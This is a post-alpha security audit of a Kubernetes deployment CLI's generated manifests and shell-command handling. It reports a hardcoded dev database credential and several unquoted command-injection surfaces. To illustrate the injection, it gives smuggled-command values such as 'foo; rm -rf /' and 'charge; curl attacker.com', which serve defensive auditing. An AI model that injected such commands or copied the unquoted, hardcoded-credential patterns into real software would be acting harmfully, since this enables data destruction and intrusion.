# Post-Alpha Security and Reliability Audit

**Date:** 2026-06-11  
**Scope:** HARDEN-001 — static analysis of generated manifests, source code security defaults,
and CLI behavior using `sun deploy --dry-run` and `sun deploy --emit-to`.  
**Method:** No live cluster was started. All findings are based on reading source code and
inspecting `--dry-run` / `--emit-to` output from a freshly scaffolded workspace.  
**Worktree:** `sun-HARDEN-001-post-alpha-security-reliability-audit`

---

## Invariant Checks

### 1. No non-empty secret values in manifests (GitOps / `--emit-to` path)

**PASS**

The `--emit-to` GitOps path emits a `Kubernetes_placeholder` secret backend by default.
`secret_doc ~redact:true` is called, which replaces all `stringData` values with `""`.
A comment instructs operators to populate values before applying.

```yaml
stringData:
  POSTGRES_URL: ""
```

`grep -r "stringData" /tmp/harden-gitops/ | grep -v ': ""'` produced no output — every
`stringData` key has an empty-string value. PASS.

**Caveat — `sun up` live path:** `sun up` and `sun deploy` (without `--emit-to`) use
`Kubernetes_live` mode, which emits the real `default_secrets` value:

```ocaml
(* sun_cli_manifest.ml line 119 *)
let default_secrets = [
  "POSTGRES_URL", "postgresql://postgres:dev@postgresql.postgresql.svc.cluster.local:5432/dev";
]
```

This hard-coded dev credential is baked into every live `kubectl apply`. There is no
mechanism to override `default_secrets` from the environment or from `sun.toml` — the
credential is only customisable through `secret_keys` in `sun.toml` (which adds additional
keys; it does not replace `POSTGRES_URL`). See finding SEC-001.

---

### 2. Containers non-root

**PASS**

Both worker and svc pod specs include:

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 65534
  runAsGroup: 65534
```

This is present in `deployment_doc`, `rollout_doc`, and `cronjob_doc` in
`cli/sun/lib/sun_cli_manifest.ml`. All three workload primitives (svc, worker, fn) are
covered.

---

### 3. Read-only root filesystem

**PASS**

Container-level `securityContext` in all three workload templates includes:

```yaml
securityContext:
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
```

Present in `deployment_doc` (line ~296–297), `rollout_doc` (line ~399–400), and
`cronjob_doc` (line ~548–549).

---

### 4. Seccomp profile

**PASS**

Pod-level `securityContext` includes:

```yaml
seccompProfile:
  type: RuntimeDefault
```

Present in `deployment_doc`, `rollout_doc`, and `cronjob_doc`. All three primitives emit
this field.

---

### 5. Services are ClusterIP not NodePort

**PASS**

`service_doc` and `blue_green_service_docs` both hardcode `type: ClusterIP`. No `NodePort`
type is emitted anywhere in manifest generation code.

`grep "type: NodePort"` on dry-run output produced no results.

---

### 6. NetworkPolicy emitted for every workload

**PASS**

`network_policy_doc` is unconditionally included in the `common` list assembled in both
`Sun_cli_manifest.render` and `Sun_cli_deployment_plan.render_spec`. Every workload
namespace (svc, worker, fn) receives an Ingress+Egress `NetworkPolicy` restricting
egress to DNS, Redpanda, PostgreSQL, and monitoring namespaces.

Dry-run output confirmed `NetworkPolicy` resources for both `audit-acme-comms` and
`audit-acme-payments`.

**Partial gap — ingress podSelector:** The `ingress.from` selector uses both
`namespaceSelector` (ingress-nginx) and an empty `podSelector: {}`. The empty podSelector
matches **all pods in the same namespace** (not all pods cluster-wide), which is intentional
for intra-namespace communication. This is correct behavior but worth documenting for
reviewers who may misread it.

---

### 7. No shell injection surfaces in CLI (user-supplied paths quoted)

**PARTIAL — two unquoted injection surfaces found**

#### 7a. `cmd_rollback.ml` — unquoted `k8s_name` and `ns` in kubectl commands

```ocaml
(* cmd_rollback.ml lines 30-42 *)
let undo_cmd = Printf.sprintf
  "kubectl rollout undo deployment/%s -n %s" k8s_name ns in
...
let status_cmd = Printf.sprintf
  "kubectl rollout status deployment/%s -n %s" k8s_name ns in
```

`k8s_name` and `ns` are derived from the filesystem directory names (`svc.name`,
`svc.domain`) and `Filename.basename (Sys.getcwd ())`. Directory names are controlled by
whoever runs `sun new` and can contain shell metacharacters. Neither value is wrapped in
`Filename.quote`.

Compare with `cmd_up.ml`'s `start_port_forward`, which **does** quote the same variables:

```ocaml
(* cmd_up.ml lines 66-67 — correct pattern *)
(Filename.quote namespace)
(Filename.quote service)
```

`cmd_rollback.ml` is inconsistent with this pattern. Severity: **medium** (requires
attacker-controlled directory naming at workspace creation time).

#### 7b. `cmd_logs.ml` — unquoted `k8s_name` and `ns` in kubectl commands

```ocaml
(* cmd_logs.ml lines 60-61, 84-85 *)
Sys.command (Printf.sprintf "kubectl get deployment %s -n %s >/dev/null 2>&1" k8s_name ns)
...
let cmd = Printf.sprintf "kubectl logs -n %s deployment/%s%s%s"
  ns k8s_name follow_flag tail_flag in
```

`k8s_name` is computed from a user-supplied positional argument (`service_arg`) via
`resolve_service`. A user can pass `"foo; rm -rf /"` as the service argument. The argument
goes through `resolve_service` which splits on `/`, but no quoting is applied before the
string is interpolated into the shell command. Severity: **medium** (user has shell access
already, but this is still a hygiene issue and a footgun for wrapper scripts that pass
user-supplied service names).

#### 7c. `cmd_up.ml` — unquoted `push_image` and `dockerfile` in docker commands

```ocaml
(* cmd_up.ml lines 215-220 *)
let docker_cmd = Printf.sprintf "docker build -t %s -f %s %s"
  push_image dockerfile repo_root in
...
Printf.sprintf "docker push %s" push_image
```

`push_image` is derived from the workspace name (directory name), registry (CLI flag),
and service name (directory name). Registry is user-supplied via `--tag` and `--registry`.
A crafted `--registry` value can inject shell commands. None of these are quoted with
`Filename.quote`. Severity: **low** (requires the attacker to control the `--registry`
CLI flag, i.e., have shell access; but a defense-in-depth concern).

#### 7d. `wait_for_rollout` in `cmd_up.ml` — unquoted namespace and name

```ocaml
(* cmd_up.ml lines 128-130 *)
let cmd = Printf.sprintf
  "kubectl rollout status deployment/%s -n %s --timeout=60s"
  name namespace
in
```

Same pattern as 7a. `name` and `namespace` come from `spec.k8s_name` / `spec.namespace`,
which are derived from filesystem directory names.

---

## Deployment Atomicity Assessment (Step 3)

**PARTIAL — no cross-service atomicity; single-service has server-side dry-run guard**

Reading `cli/sun/lib/sun_cli_manifest.ml` lines 633–649 (`apply`):

```ocaml
let apply (ns_yaml, workload_yaml) ~dry_run =
  if dry_run then ...
  else begin
    apply_live ns_yaml;             (* namespace created first — cannot roll back *)
    let tmp = write_tmp workload_yaml in
    (try
      let rc = Sys.command (... "--dry-run=server ...") in  (* server-side validation *)
      if rc <> 0 then raise (Deploy_failed ...);
      let rc = Sys.command (... "kubectl apply -f %s" ...) in  (* real apply *)
      ...
```

**Positive:** A Kubernetes server-side dry-run is performed before the real apply, catching
invalid manifests before they partially apply. This prevents most single-service partial
state.

**Gap — namespace pre-creation:** The `Namespace` manifest is applied via `apply_live`
before the server-side dry-run of workload resources. If the workload dry-run fails, the
namespace has already been created and is not cleaned up. This is a minor issue because
namespace creation is idempotent, but it means a failed deploy leaves an empty namespace.

**Gap — no cross-service transaction:** `cmd_up.ml` iterates over `plan.services` one at
a time with `List.iter`. If service N+1 fails, services 0..N are already applied. There is
no rollback of earlier services. An operator is left in a partially-deployed state with no
automated remediation. The `sun rollback` command can be used manually per-service, but
there is no automated compensating transaction.

---

## Rollback Path Assessment (Step 4)

**PASS with quoting caveat**

`cmd_rollback.ml` correctly uses `kubectl rollout undo` and `kubectl rollout status`.
The path logic uses `namespace_of` which derives names from filesystem directory scans
(not raw user input passed directly to shell), so the injection risk is reduced.

However, as noted in finding SEC-002, `k8s_name` and `ns` in rollback commands are not
quoted with `Filename.quote`, which is an inconsistency with the quoting discipline in
`cmd_up.ml`.

---

## GitOps Output Safety (Step 5)

**PASS**

`sun deploy --dry-run --emit-to /tmp/harden-gitops` produced files where all `stringData`
values are `""`:

```
grep -r "stringData" /tmp/harden-gitops/ | grep -v ': ""'
(no output)
```

The `Kubernetes_placeholder` backend is the default for `--emit-to`. The dev credential
`postgresql://postgres:dev@...` does not appear in any GitOps-emitted file.

---

## Findings Summary

| ID | Invariant | Result | Severity |
|----|-----------|--------|----------|
| SEC-001 | No non-empty secret values in manifests (live path) | FAIL | HIGH |
| SEC-002 | No shell injection in CLI (rollback, logs) | PARTIAL | MEDIUM |
| — | Containers non-root | PASS | — |
| — | Read-only root filesystem | PASS | — |
| — | Seccomp profile | PASS | — |
| — | Services ClusterIP not NodePort | PASS | — |
| — | NetworkPolicy for every workload | PASS | — |
| — | GitOps output safe | PASS | — |
| — | Atomicity (single-service) | PASS | — |
| — | Atomicity (cross-service) | PARTIAL | LOW |
| — | Rollback path safe | PASS (with caveat) | — |

---

## Detailed Findings

### SEC-001 — Hardcoded dev credential in live Kubernetes Secret (HIGH)

**File:** `cli/sun/lib/sun_cli_manifest.ml` line 119

`default_secrets` contains a real, non-empty `POSTGRES_URL` value with a plaintext dev
password. When `sun up` or `sun deploy` (without `--emit-to`) runs in `Kubernetes_live`
mode, this value is written verbatim into a `stringData:` block of a Kubernetes `Secret`
and applied to the cluster via `kubectl apply`. There is no mechanism in `sun.toml` or
environment variables to override this default before manifest emission.

**Risk:** Any operator who runs `sun up` against a production cluster without understanding
that `POSTGRES_URL` must be overridden will deploy with `password=dev`. Kubernetes stores
the Secret base64-encoded (not encrypted at rest by default), making it readable to anyone
with `get secret` RBAC on the namespace.

**Remediation:** Remove the password from `default_secrets`. Replace with an empty string
(`""`) and add a `sun up` pre-flight check that warns if `POSTGRES_URL` has not been
overridden. Alternatively, gate `Kubernetes_live` mode to also require a non-empty
`POSTGRES_URL` from the environment.

---

### SEC-002 — Unquoted shell variables in `kubectl` commands (MEDIUM)

**Files:**
- `cli/sun/bin/cmd_rollback.ml` lines 30, 42
- `cli/sun/bin/cmd_logs.ml` lines 61, 84
- `cli/sun/bin/cmd_up.ml` lines 129–130

`k8s_name`, `ns`, and in `cmd_logs` the user-supplied service argument, are interpolated
into `Sys.command` shell strings without `Filename.quote`. The codebase already uses
`Filename.quote` correctly in `start_port_forward` (cmd_up.ml line 66–67) and
`apply_live` (sun_cli_manifest.ml line 629). The rollback and logs commands are
inconsistent with this established pattern.

**Risk:** A workspace directory named with shell metacharacters (e.g., `charge; curl
attacker.com`) would cause command injection when `sun rollback` or `sun logs` runs.
For `sun logs`, the user-supplied service name is controlled directly by the caller.

**Remediation:** Wrap all interpolated identifiers in `Filename.quote` in the affected
commands, matching the existing pattern. The docker build/push commands in `cmd_up.ml`
should also quote `push_image`, `dockerfile`, and `repo_root`.

---

## Overall Verdict

**Needs fixes before production use.**

The pod security posture (non-root, read-only filesystem, seccomp, NetworkPolicy,
ClusterIP-only services) is solid and covers all three workload primitives. The GitOps
`--emit-to` path correctly redacts all secret values.

Two issues block production readiness:

1. **SEC-001 (HIGH):** The `sun up` live deploy path bakes a hardcoded dev credential
   (`postgres:dev`) into every Kubernetes Secret. An operator who does not know to override
   this value will run production with a weak, well-known password.

2. **SEC-002 (MEDIUM):** Shell metacharacters in workspace directory names or user-supplied
   service arguments are not quoted in several `kubectl` commands, creating a command
   injection surface in `sun rollback` and `sun logs`.

Both issues are straightforward to fix. Once resolved, the manifest security posture is
suitable for alpha production use.
